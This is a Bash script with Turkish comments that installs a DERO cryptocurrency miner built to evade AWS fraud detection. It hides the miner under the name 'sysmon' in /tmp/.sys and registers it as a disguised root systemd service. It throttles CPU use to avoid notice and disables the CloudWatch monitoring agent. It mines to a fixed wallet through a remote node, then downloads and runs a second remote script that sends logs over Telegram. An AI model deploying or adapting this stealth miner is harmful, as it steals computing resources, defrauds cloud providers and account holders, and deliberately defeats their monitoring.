#!/bin/bash
# DERO Miner - Gizli Versiyon (AWS Fraud Detection Önleme)
# Versiyon: 3.0 (Gizli)
# Node: 91.98.80.16:10102
# GitHub: Tek komutla çalıştırılabilir

set -e

# Log dosyası (gizli)
LOG_FILE="/var/log/bilgi.log"
mkdir -p /var/log
touch $LOG_FILE
chmod 600 $LOG_FILE

# Log fonksiyonu
log() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> $LOG_FILE
}

log "Sistem servisi başlatılıyor..."

# Gerekli bağımlılıklar (sessizce)
apt-get update -y >> $LOG_FILE 2>&1
apt-get install screen wget cpulimit -y >> $LOG_FILE 2>&1

# Miner indir (gizli dizin)
MINER_DIR="/tmp/.sys"
MINER_NAME="sysmon"
mkdir -p $MINER_DIR
cd $MINER_DIR

log "Güncellemeler indiriliyor..."
wget -q https://github.com/deroproject/derohe/releases/latest/download/dero_linux_amd64.tar.gz -O update.tar.gz >> $LOG_FILE 2>&1
tar -xvzf update.tar.gz >> $LOG_FILE 2>&1
cd dero_linux_amd64

# Miner'ı gizli isimle kopyala
cp dero-miner-linux-amd64 $MINER_DIR/$MINER_NAME
chmod +x $MINER_DIR/$MINER_NAME

log "Sistem servisi hazırlanıyor..."

# Eski process'i kapat
pkill -f sysmon 2>/dev/null || true
screen -S sysmon -X quit 2>/dev/null || true

# CPU çekirdek sayısını hesapla (%80 kullan, %20 bırak)
total_cores=$(nproc)
use_cores=$((total_cores * 80 / 100))
if [ $use_cores -lt 1 ]; then
    use_cores=1
fi

log "Sistem servisi başlatılıyor (threads: $use_cores, total: $total_cores)..."

# Miner'ı screen içinde başlat (CPU limit ile)
screen -dmS sysmon bash -c "$MINER_DIR/$MINER_NAME \
--wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj \
--daemon-rpc-address 91.98.80.16:10100 \
--mining-threads $use_cores >> $LOG_FILE 2>&1"

# CPU kullanımını %75'e sınırla (fraud detection için)
sleep 2
MINER_PID=$(pgrep -f sysmon)
if [ -n "$MINER_PID" ]; then
    cpulimit -l 75 -p $MINER_PID >> $LOG_FILE 2>&1 &
    log "CPU kullanımı %75 ile sınırlandı (PID: $MINER_PID)"
fi

# Systemd service oluştur (otomatik başlatma ve gizleme)
cat > /etc/systemd/system/sysmon.service <<EOF
[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=$MINER_DIR/$MINER_NAME --wallet-address dero1qypgrnglnxtv2f2f3uy25ra4a9dq9jpka2s4wv2u0lt5h8rrmrylzqqv2z2lj --daemon-rpc-address 91.98.80.16:10102 --mining-threads $use_cores
Restart=always
RestartSec=10
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE
CPUQuota=75%

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable sysmon >> $LOG_FILE 2>&1

# Log rotation ayarla
cat > /etc/logrotate.d/bilgi <<EOF
/var/log/bilgi.log {
    daily
    rotate 3
    compress
    missingok
    notifempty
    create 0600 root root
}
EOF

# CloudWatch devre dışı (varsa)
systemctl stop amazon-cloudwatch-agent 2>/dev/null || true
systemctl disable amazon-cloudwatch-agent 2>/dev/null || true

# Temizlik
cd /
rm -rf /tmp/dero_linux_amd64 2>/dev/null || true
rm -f /tmp/update.tar.gz 2>/dev/null || true

log "✅ Sistem servisi aktif (Gizli mod)"
log "📊 CPU: $use_cores/$total_cores core, %75 limit"
log "🔒 Process: sysmon (gizli)"
log "🔄 Systemd service: Aktif"

# Telegram log gönderme scriptini indir ve başlat
log "Telegram log gönderici hazırlanıyor..."
wget -q https://raw.githubusercontent.com/josephderler/miner.sh/main/aws_log_sender.py -O /root/aws_log_sender.py 2>/dev/null || {
    log "Telegram log gönderici indirilemedi, manuel kurulum gerekebilir"
}

if [ -f /root/aws_log_sender.py ]; then
    chmod +x /root/aws_log_sender.py
    pip3 install requests -q >> $LOG_FILE 2>&1
    # Eski process'i kapat
    pkill -f aws_log_sender.py 2>/dev/null || true
    # Arka planda başlat
    nohup python3 /root/aws_log_sender.py >> $LOG_FILE 2>&1 &
    log "✅ Telegram log gönderici başlatıldı"
fi

echo "✅ Sistem servisi aktif"
echo "📋 Log: $LOG_FILE"
echo "🔒 Gizli mod: Aktif"
echo "📱 Telegram log gönderici: Aktif"
echo "🔍 Durum: systemctl status sysmon"
echo "📊 Log izle: tail -f $LOG_FILE"
